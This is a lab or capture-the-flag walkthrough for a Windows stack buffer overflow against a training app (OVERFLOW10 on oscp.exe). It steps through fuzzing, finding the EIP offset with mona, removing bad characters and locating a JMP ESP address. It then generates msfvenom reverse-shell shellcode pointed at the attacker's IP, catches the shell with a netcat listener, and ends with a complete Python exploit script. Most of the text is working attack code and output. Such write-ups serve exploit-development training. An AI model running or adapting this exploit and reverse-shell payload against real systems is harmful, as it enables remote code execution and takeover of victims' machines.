# Buffer Overflow (Task 10)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.44.69
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /workarea /v:$TARGET
```
```bash
cd exploits
vim fuzzer.py # update the IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.44.69
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l ???

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona findmsp -distance 1000

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 1000
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x01a2f813 (length 1000 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0084394b (length 1000 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x00844d7b (length 1000 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x41397241 (offset 537) # <-- LOOK AT THIS
0BADF00D       ESP (0x01a2fa30) points at offset 541 in normal pattern (length 459)
0BADF00D       EBP contains normal pattern : 0x38724137 (offset 533)
0BADF00D       EBX contains normal pattern : 0x72413672 (offset 529)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 1000 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x01a2f648 to 0x01a2fe1c (0x000007d4 bytes)
0BADF00D       0x01a2f814 : Contains normal cyclic pattern at ESP-0x21c (-540) : offset 1, length 999 (-> 0x01a2fbfa : ESP+0x1cb)
0BADF00D   [+] Examining stack (+- 1000 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x01a2f648 to 0x01a2fe1c (0x000007d4 bytes)
0BADF00D       0x01a2f7bc : Pointer into normal cyclic pattern at ESP-0x274 (-628) : 0x01a2f8a0 : offset 141, length 859
0BADF00D       0x01a2f7c0 : Pointer into normal cyclic pattern at ESP-0x270 (-624) : 0x01a2f890 : offset 125, length 875
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.669000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: 537, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 0182FA30

# output
0BADF00D   [+] Command used:
0BADF00D   !mona compare -f c:\mona\oscp\bytearray.bin -a 0182FA30
0BADF00D   [+] Reading file c:\mona\oscp\bytearray.bin...
0BADF00D       Read 255 bytes from file
0BADF00D   [+] Preparing output file 'compare.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\compare.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] c:\mona\oscp\bytearray.bin has been recognized as RAW bytes.
0BADF00D   [+] Fetched 255 bytes successfully from c:\mona\oscp\bytearray.bin
0BADF00D       - Comparing 1 location(s)
0BADF00D   Comparing bytes from file with memory :
0182FA30   [+] Comparing with memory at location : 0x0182fa30 (Stack)
0182FA30   Only 245 original bytes of 'normal' code found.
0182FA30       ,-----------------------------------------------.
0182FA30       | Comparison results:                           |
0182FA30       |-----------------------------------------------|
0182FA30     0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
0182FA30       |                                               | Memory
0182FA30    10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
0182FA30       |                                               | Memory
0182FA30    20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
0182FA30       |                                               | Memory
0182FA30    30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
0182FA30       |                                               | Memory
0182FA30    40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
0182FA30       |                                               | Memory
0182FA30    50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
0182FA30       |                                               | Memory
0182FA30    60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
0182FA30       |                                               | Memory
0182FA30    70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
0182FA30       |                                               | Memory
0182FA30    80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
0182FA30       |                                               | Memory
0182FA30    90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
0182FA30       |                                             0a| Memory # <-- LOOK
0182FA30    a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
0182FA30       |0d                                  0a 0d      | Memory # <-- LOOK
0182FA30    b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
0182FA30       |                                       0a 0d   | Memory # <-- LOOK
0182FA30    c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
0182FA30       |                                               | Memory
0182FA30    d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
0182FA30       |                                       0a 0d   | Memory # <-- LOOK
0182FA30    e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
0182FA30       |                                          0a 0d| Memory # <-- LOOK
0182FA30    f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
0182FA30       |                                               | Memory
0182FA30       `-----------------------------------------------'
0182FA30
0182FA30                   | File      | Memory    | Note
0182FA30   -----------------------------------------------------
0182FA30   0   0   159 159 | 01 ... 9f | 01 ... 9f | unmodified!
0182FA30   159 159 2   2   | a0 a1     | 0a 0d     | corrupted
0182FA30   161 161 11  11  | a2 ... ac | a2 ... ac | unmodified!
0182FA30   172 172 2   2   | ad ae     | 0a 0d     | corrupted
0182FA30   174 174 15  15  | af ... bd | af ... bd | unmodified!
0182FA30   189 189 2   2   | be bf     | 0a 0d     | corrupted
0182FA30   191 191 30  30  | c0 ... dd | c0 ... dd | unmodified!
0182FA30   221 221 2   2   | de df     | 0a 0d     | corrupted
0182FA30   223 223 15  15  | e0 ... ee | e0 ... ee | unmodified!
0182FA30   238 238 2   2   | ef f0     | 0a 0d     | corrupted
0182FA30   240 240 15  15  | f1 ... ff | f1 ... ff | unmodified!
0182FA30   -----------------------------------------------------
0182FA30
0182FA30   Possibly bad chars: a0 a1 ad ae be bf de df ef f0
0182FA30   Bytes omitted from input: 00
0182FA30
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.327000
```

```bash
# repeat the following until "Status = Unmodified": 
#   start app
#   send exploit
#   generate a new byte array
#   compare to ESP
#   remove bad characters (look at the Comparison Results table in the Log data window, remove the characters underlined by "0a")

# ESP     , BADCHARS
# 0182FA30, "\x00\xa0\xad\xbe\xde\xef"

vim exploit.py # BADCHARS = "\x00\xa0\xad\xbe\xde\xef"
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona compare -f c:\mona\oscp\bytearray.bin -a 018AFA30

# output
0BADF00D   [+] Command used:
0BADF00D   !mona compare -f c:\mona\oscp\bytearray.bin -a 018AFA30
0BADF00D   [+] Reading file c:\mona\oscp\bytearray.bin...
0BADF00D       Read 250 bytes from file
0BADF00D   [+] Preparing output file 'compare.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\compare.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] c:\mona\oscp\bytearray.bin has been recognized as RAW bytes.
0BADF00D   [+] Fetched 250 bytes successfully from c:\mona\oscp\bytearray.bin
0BADF00D       - Comparing 1 location(s)
0BADF00D   Comparing bytes from file with memory :
018AFA30   [+] Comparing with memory at location : 0x018afa30 (Stack)
018AFA30   !!! Hooray, normal shellcode unmodified !!!
018AFA30   Bytes omitted from input: 00 a0 ad be de ef
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.312000
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\xa0\xad\xbe\xde\xef"

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\xa0\xad\xbe\xde\xef"

           ---------- Mona command started on 2021-08-28 20:51:58 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\xa0\xad\xbe\xde\xef"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <-- USING THIS ONE
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.250000
```

```bash
# ADDRESS: "\x62\x50\x11\xaf" # address of JMP instruction
# RETN: "\xaf\x11\x50\x62" # address of JMP instrucion, in Little Endian
```

## Generate a Payload
```bash
ip address
LHOST=10.8.224.177 # USE YOUR IP ADDRESS!
BADCHARS="\x00\xa0\xad\xbe\xde\xef" 
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1842 bytes
PAYLOAD =  b""
PAYLOAD += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
PAYLOAD += b"\x81\x76\x0e\xe1\xe7\x79\x4b\x83\xee\xfc\xe2\xf4"
PAYLOAD += b"\x1d\x0f\xfb\x4b\xe1\xe7\x19\xc2\x04\xd6\xb9\x2f"
PAYLOAD += b"\x6a\xb7\x49\xc0\xb3\xeb\xf2\x19\xf5\x6c\x0b\x63"
PAYLOAD += b"\xee\x50\x33\x6d\xd0\x18\xd5\x77\x80\x9b\x7b\x67"
PAYLOAD += b"\xc1\x26\xb6\x46\xe0\x20\x9b\xb9\xb3\xb0\xf2\x19"
PAYLOAD += b"\xf1\x6c\x33\x77\x6a\xab\x68\x33\x02\xaf\x78\x9a"
PAYLOAD += b"\xb0\x6c\x20\x6b\xe0\x34\xf2\x02\xf9\x04\x43\x02"
PAYLOAD += b"\x6a\xd3\xf2\x4a\x37\xd6\x86\xe7\x20\x28\x74\x4a"
PAYLOAD += b"\x26\xdf\x99\x3e\x17\xe4\x04\xb3\xda\x9a\x5d\x3e"
PAYLOAD += b"\x05\xbf\xf2\x13\xc5\xe6\xaa\x2d\x6a\xeb\x32\xc0"
PAYLOAD += b"\xb9\xfb\x78\x98\x6a\xe3\xf2\x4a\x31\x6e\x3d\x6f"
PAYLOAD += b"\xc5\xbc\x22\x2a\xb8\xbd\x28\xb4\x01\xb8\x26\x11"
PAYLOAD += b"\x6a\xf5\x92\xc6\xbc\x8f\x4a\x79\xe1\xe7\x11\x3c"
PAYLOAD += b"\x92\xd5\x26\x1f\x89\xab\x0e\x6d\xe6\x18\xac\xf3"
PAYLOAD += b"\x71\xe6\x79\x4b\xc8\x23\x2d\x1b\x89\xce\xf9\x20"
PAYLOAD += b"\xe1\x18\xac\x1b\xb1\xb7\x29\x0b\xb1\xa7\x29\x23"
PAYLOAD += b"\x0b\xe8\xa6\xab\x1e\x32\xee\x21\xe4\x8f\x73\x43"
PAYLOAD += b"\x01\x56\x11\x49\xe1\xe6\xc2\xc2\x07\x8d\x69\x1d"
PAYLOAD += b"\xb6\x8f\xe0\xee\x95\x86\x86\x9e\x64\x27\x0d\x47"
PAYLOAD += b"\x1e\xa9\x71\x3e\x0d\x8f\x89\xfe\x43\xb1\x86\x9e"
PAYLOAD += b"\x89\x84\x14\x2f\xe1\x6e\x9a\x1c\xb6\xb0\x48\xbd"
PAYLOAD += b"\x8b\xf5\x20\x1d\x03\x1a\x1f\x8c\xa5\xc3\x45\x4a"
PAYLOAD += b"\xe0\x6a\x3d\x6f\xf1\x21\x79\x0f\xb5\xb7\x2f\x1d"
PAYLOAD += b"\xb7\xa1\x2f\x05\xb7\xb1\x2a\x1d\x89\x9e\xb5\x74"
PAYLOAD += b"\x67\x18\xac\xc2\x01\xa9\x2f\x0d\x1e\xd7\x11\x43"
PAYLOAD += b"\x66\xfa\x19\xb4\x34\x5c\x99\x56\xcb\xed\x11\xed"
PAYLOAD += b"\x74\x5a\xe4\xb4\x34\xdb\x7f\x37\xeb\x67\x82\xab"
PAYLOAD += b"\x94\xe2\xc2\x0c\xf2\x95\x16\x21\xe1\xb4\x86\x9e"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.44.69] 49279
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.44.69" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW10 " # change me; vulnerable function of target
OFFSET = 537 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\xa0\xad\xbe\xde\xef" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
PAYLOAD += b"\x81\x76\x0e\xe1\xe7\x79\x4b\x83\xee\xfc\xe2\xf4"
PAYLOAD += b"\x1d\x0f\xfb\x4b\xe1\xe7\x19\xc2\x04\xd6\xb9\x2f"
PAYLOAD += b"\x6a\xb7\x49\xc0\xb3\xeb\xf2\x19\xf5\x6c\x0b\x63"
PAYLOAD += b"\xee\x50\x33\x6d\xd0\x18\xd5\x77\x80\x9b\x7b\x67"
PAYLOAD += b"\xc1\x26\xb6\x46\xe0\x20\x9b\xb9\xb3\xb0\xf2\x19"
PAYLOAD += b"\xf1\x6c\x33\x77\x6a\xab\x68\x33\x02\xaf\x78\x9a"
PAYLOAD += b"\xb0\x6c\x20\x6b\xe0\x34\xf2\x02\xf9\x04\x43\x02"
PAYLOAD += b"\x6a\xd3\xf2\x4a\x37\xd6\x86\xe7\x20\x28\x74\x4a"
PAYLOAD += b"\x26\xdf\x99\x3e\x17\xe4\x04\xb3\xda\x9a\x5d\x3e"
PAYLOAD += b"\x05\xbf\xf2\x13\xc5\xe6\xaa\x2d\x6a\xeb\x32\xc0"
PAYLOAD += b"\xb9\xfb\x78\x98\x6a\xe3\xf2\x4a\x31\x6e\x3d\x6f"
PAYLOAD += b"\xc5\xbc\x22\x2a\xb8\xbd\x28\xb4\x01\xb8\x26\x11"
PAYLOAD += b"\x6a\xf5\x92\xc6\xbc\x8f\x4a\x79\xe1\xe7\x11\x3c"
PAYLOAD += b"\x92\xd5\x26\x1f\x89\xab\x0e\x6d\xe6\x18\xac\xf3"
PAYLOAD += b"\x71\xe6\x79\x4b\xc8\x23\x2d\x1b\x89\xce\xf9\x20"
PAYLOAD += b"\xe1\x18\xac\x1b\xb1\xb7\x29\x0b\xb1\xa7\x29\x23"
PAYLOAD += b"\x0b\xe8\xa6\xab\x1e\x32\xee\x21\xe4\x8f\x73\x43"
PAYLOAD += b"\x01\x56\x11\x49\xe1\xe6\xc2\xc2\x07\x8d\x69\x1d"
PAYLOAD += b"\xb6\x8f\xe0\xee\x95\x86\x86\x9e\x64\x27\x0d\x47"
PAYLOAD += b"\x1e\xa9\x71\x3e\x0d\x8f\x89\xfe\x43\xb1\x86\x9e"
PAYLOAD += b"\x89\x84\x14\x2f\xe1\x6e\x9a\x1c\xb6\xb0\x48\xbd"
PAYLOAD += b"\x8b\xf5\x20\x1d\x03\x1a\x1f\x8c\xa5\xc3\x45\x4a"
PAYLOAD += b"\xe0\x6a\x3d\x6f\xf1\x21\x79\x0f\xb5\xb7\x2f\x1d"
PAYLOAD += b"\xb7\xa1\x2f\x05\xb7\xb1\x2a\x1d\x89\x9e\xb5\x74"
PAYLOAD += b"\x67\x18\xac\xc2\x01\xa9\x2f\x0d\x1e\xd7\x11\x43"
PAYLOAD += b"\x66\xfa\x19\xb4\x34\x5c\x99\x56\xcb\xed\x11\xed"
PAYLOAD += b"\x74\x5a\xe4\xb4\x34\xdb\x7f\x37\xeb\x67\x82\xab"
PAYLOAD += b"\x94\xe2\xc2\x0c\xf2\x95\x16\x21\xe1\xb4\x86\x9e"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
